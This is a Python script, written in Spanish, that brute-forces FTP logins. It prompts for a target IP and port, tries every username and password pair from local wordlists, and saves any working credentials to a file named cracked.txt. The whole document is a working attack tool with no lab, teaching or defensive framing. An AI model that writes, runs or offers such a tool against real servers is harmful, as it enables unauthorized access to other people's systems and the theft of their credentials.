import os
import importlib.util
import ftplib
import time

def verificar_dependencia(nombre_paquete):
    if importlib.util.find_spec(nombre_paquete) is None:
        print(f"[ ! ] {nombre_paquete} no está instalado, instalando...")
        os.system(f"pip install {nombre_paquete}")
        time.sleep(2)
        os.system('cls' if os.name == 'nt' else 'clear')
    else:
        print(f"[ + ] {nombre_paquete} ya está instalado.")
        time.sleep(2)
        os.system('cls' if os.name == 'nt' else 'clear')

print("[ VERIFICADOR DE DEPENDENCIAS ]")
verificar_dependencia("colorama")

from colorama import Fore, Style, Back, init
init()

logo = f"""{Style.BRIGHT}
        {Style.BRIGHT}~+

                 {Style.BRIGHT}*       +
           {Style.BRIGHT}'                  |
       {Style.BRIGHT}()    .-.,="``"=.    - o -
             {Style.BRIGHT}'=/_       \     |
          {Style.BRIGHT}*   |  '=._    |
               {Style.BRIGHT}\     `=./`,        '
            {Style.BRIGHT}.   '=.__.=' `='      *
   {Style.BRIGHT}+                         +
        {Style.BRIGHT}O      *        '       .{Style.RESET_ALL}"""
print(logo)
print(f"{Style.BRIGHT}{Fore.RED}[ {Fore.YELLOW}! {Fore.RED}]{Fore.GREEN} Recuerd que la fuerza bruta es lenta!! {Style.RESET_ALL}")
print("")
ip = input(f"{Style.BRIGHT}{Fore.RED}[ {Fore.YELLOW}? {Fore.RED}]{Fore.WHITE} IP: {Style.RESET_ALL}")
puerto = int(input(f"{Style.BRIGHT}{Fore.RED}[ {Fore.YELLOW}? {Fore.RED}]{Fore.WHITE} PUERTO: {Style.RESET_ALL}"))

usuarios = open("usuarios.txt", "r")
usuarios = usuarios.read().split("\n")
passwords = open("passwords.txt", "r")
passwords = passwords.read().split("\n")

def ataque_todo(ip, puerto):
    for usuario in usuarios:
        for password in passwords:
            ftp = ftplib.FTP()
            try:
                ftp.connect(ip, puerto)
                ftp.login(user=usuario, passwd=password)
                print(f"Autenticado con exito: Usuario: {usuario}, Password: {password}")
                
                with open("cracked.txt", "a") as f:
                    f.write(f"IP= {ip} PORT= {puerto} user= {usuario} password= {password}\n")
                
                ftp.quit()
                return
            except ftplib.all_errors as e:
                print(f"Error con Usuario: {usuario}, Password: {password} - {e}")
                ftp.quit()

ataque_todo(ip, puerto)